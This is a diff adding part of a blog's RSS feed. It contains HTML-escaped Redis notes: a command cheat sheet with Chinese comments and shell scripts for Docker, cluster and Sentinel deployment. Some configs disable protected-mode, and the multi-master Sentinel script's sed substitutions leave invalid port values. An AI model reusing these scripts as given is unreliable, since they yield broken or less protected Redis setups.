+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 将值 value 插入到列表 key 当中，位于值 p 之前或之后 after&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>linsert k before p v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 将一个或多个值 value插入到列表 key 的表尾&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rpush k v1 v2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rpushx k v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rpop
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 在一个原子时间内，执行两个动作：&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 将列表 src 中的尾元素弹出返回，并插入到列表 dest&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rpoplpush src dest
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="hash">hash&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>hset k f v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 将哈希表 key 中的域 field 的值设置为 value ，当且仅当域 field 不存在。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hsetnx k f v
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hexists k f
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hlen k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 删除哈希表 key 中的一个或多个指定域，不存在的域将被忽略。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hdel k f1 f2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># ++&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hincrby k f increment
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hgetall k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回哈希表 key 中的所有域&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hkeys k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回哈希表 key 中所有域的值&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hvals k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 同时将多个 field-value (域-值)对设置到哈希表 key 中&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hmset k f1 v1 f2 v2
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="set">set&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 已经存在于集合的 member 元素将被忽略。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sadd k m1 m2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>smembers k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 集合中元素的数量&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>scard k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 判断 member 元素是否集合 key 的成员&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sismember k m
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 移除并返回集合中的一个随机元素&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>spop k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回集合中的一个随机元素&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>srandmember k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 移除集合 key 中的一个或多个member 元素，不存在的 member 元素会被忽略&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>srem k m1 m2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 原子性操作 将 member 元素从 source 集合移动到 destination 集合&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>smove src dest m
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sdiff set1 set2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sdiffstore diffSet set1 set2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sunion set1 set2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sinterstore interSet set1 set2
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="zset">zset&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>zadd k score1 m1 score2 m2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zcard k
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zincrby k increment m
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回有序集 key 中， score 值在 min 和 max 之间&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># (默认包括 score 值等于 min 或 max )的成员的数量&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zcount k min max
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回有序集 key 中，指定区间内的成员&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 其中成员的位置按 score 值递增(从小到大)来排序。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zrange k start end withscores
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 按 score 值递减(从大到小)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zrevrange k start end withscores
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回所有 score 值介于 min 和 max 之间&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># (包括等于 min 或 max )的成员&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zrangebyscore k min max withscores limit offset count
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回有序集 key 中成员 member 的排名&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 其中有序集成员按score 值递增(从小到大)顺序排列。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zrank k m
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zrevrank k m
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回有序集 key 中，成员 member 的 score 值。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zscore k m
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zrem k m1 m2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 移除有序集 key 中，指定排名(rank)区间内的所有成员&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zremrangebyrank k start end
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zremrangebyscore k min max
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="info">info&lt;/h2>
+&lt;h3 id="info-memory">&lt;code>info memory&lt;/code>&lt;/h3>
+&lt;p>&lt;strong>used_memory&lt;/strong>, include used swap space&lt;/p>
+&lt;p>&lt;strong>used_memory_human&lt;/strong>&lt;/p>
+&lt;p>&lt;strong>used_memory_rss&lt;/strong>, same as &lt;code>top&lt;/code> or &lt;code>ps&lt;/code>, exclude used swap space&lt;/p>
+&lt;p>&lt;strong>mem_fragmentation_ratio&lt;/strong> same as &lt;code>used_memory_rss / used_memory&lt;/code> fragmentation ratio&lt;/p>
+&lt;p>health value is 1.03 for jemalloc&lt;/p>
+&lt;p>&lt;strong>mem_allocator&lt;/strong> libc, jemalloc or tcmalloc&lt;/p></description></item><item><title>Note: Redis Deploy</title><link>/note/data/redis/redis-deploy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/data/redis/redis-deploy/</guid><description>
+&lt;h2 id="container">container&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker run -it -d --name redis -p 6379:6379 redis
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="sentinel">sentinel&lt;/h2>
+&lt;h3 id="localhost">localhost&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>config &lt;span style="color:#204a87">set&lt;/span> protected-mode no
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="multi-master-3-master-3-slave-and-3-sentinel">multi master (3 master, 3 slave, and 3 sentinel)&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>cat &lt;span style="color:#4e9a06">&amp;lt;&amp;lt; EOF &amp;gt; redis.conf
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">port 7000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">daemonize yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">cluster-enabled yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">cluster-config-file 7000/nodes.conf
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">cluster-node-timeout 5000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">appendonly yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir &lt;span style="color:#0000cf;font-weight:bold">7000&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7001&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7002&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7003&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7004&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7005&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7000/g &amp;gt; 7000/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7001/g &amp;gt; 7001/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7002/g &amp;gt; 7002/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7003/g &amp;gt; 7003/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7004/g &amp;gt; 7004/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7005/g &amp;gt; 7005/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">export&lt;/span> &lt;span style="color:#000">redis_server&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;../redis/src/redis-server&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7000/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7001/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7002/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7003/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7004/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7005/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># three master &amp;amp; three slave&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>../redis/src/redis-trib.rb create --replicas &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span> 127.0.0.1:7000 127.0.0.1:7001 &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span>127.0.0.1:7002 127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>cat &lt;span style="color:#4e9a06">&amp;lt;&amp;lt; EOF &amp;gt; sentinel.conf
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">port 26379
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">daemonize yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel monitor mymaster1 127.0.0.1 %port1 2
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel down-after-milliseconds mymaster1 60000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel failover-timeout mymaster1 180000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel parallel-syncs mymaster1 1
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel monitor mymaster2 127.0.0.1 %port2 2
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel down-after-milliseconds mymaster2 60000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel failover-timeout mymaster2 180000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel parallel-syncs mymaster2 1
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel monitor mymaster3 127.0.0.1 %port3 2
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel down-after-milliseconds mymaster3 60000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel failover-timeout mymaster3 180000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel parallel-syncs mymaster3 1
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat sentinel.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/26379/26379/g &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed &lt;span style="color:#4e9a06">&amp;#39;s/%port1/1/g&amp;#39;&lt;/span> &amp;gt; sentinel_0.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat sentinel.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/26379/36379/g &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed &lt;span style="color:#4e9a06">&amp;#39;s/%port2//g&amp;#39;&lt;/span> &amp;gt; sentinel_1.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat sentinel.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/26379/46379/g &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed &lt;span style="color:#4e9a06">&amp;#39;s/%port3//g&amp;#39;&lt;/span> &amp;gt; sentinel_2.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">export&lt;/span> &lt;span style="color:#000">redis_server&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;../redis/src/redis-server&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> sentinel_0.conf --sentinel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> sentinel_1.conf --sentinel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> sentinel_2.conf --sentinel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="single-master1-master-5-slave-and-3-sentinel">single master(1 master, 5 slave, and 3 sentinel)&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>cat &lt;span style="color:#4e9a06">&amp;lt;&amp;lt; EOF &amp;gt; redis.conf
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">port 7000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">daemonize yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">protected-mode no
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"># cluster-enabled yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">cluster-config-file 7000/nodes.conf
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">cluster-node-timeout 5000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">appendonly yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir &lt;span style="color:#0000cf;font-weight:bold">7000&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7001&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7002&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7003&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7004&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">7005&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7000/g &amp;gt; 7000/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7001/g &amp;gt; 7001/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7002/g &amp;gt; 7002/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7003/g &amp;gt; 7003/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7004/g &amp;gt; 7004/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat redis.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/7000/7005/g &amp;gt; 7005/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">export&lt;/span> &lt;span style="color:#000">redis_server&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;../redis/src/redis-server&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># master&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7000/redis.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># slave&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7001/redis.conf --slaveof 127.0.0.1 &lt;span style="color:#0000cf;font-weight:bold">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7002/redis.conf --slaveof 127.0.0.1 &lt;span style="color:#0000cf;font-weight:bold">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7003/redis.conf --slaveof 127.0.0.1 &lt;span style="color:#0000cf;font-weight:bold">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7004/redis.conf --slaveof 127.0.0.1 &lt;span style="color:#0000cf;font-weight:bold">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> 7005/redis.conf --slaveof 127.0.0.1 &lt;span style="color:#0000cf;font-weight:bold">7000&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>cat &lt;span style="color:#4e9a06">&amp;lt;&amp;lt; EOF &amp;gt; sentinel.conf
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">port 26379
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">daemonize yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">protected-mode no
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel monitor mymaster 127.0.0.1 7000 2
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel down-after-milliseconds mymaster 60000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel failover-timeout mymaster 180000
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">sentinel parallel-syncs mymaster 1
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat sentinel.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/26379/26379/g &amp;gt; sentinel_0.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat sentinel.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/26379/36379/g &amp;gt; sentinel_1.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat sentinel.conf &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed s/26379/46379/g &amp;gt; sentinel_2.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">redis_server&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;../redis/src/redis-server&amp;#39;&lt;/span>
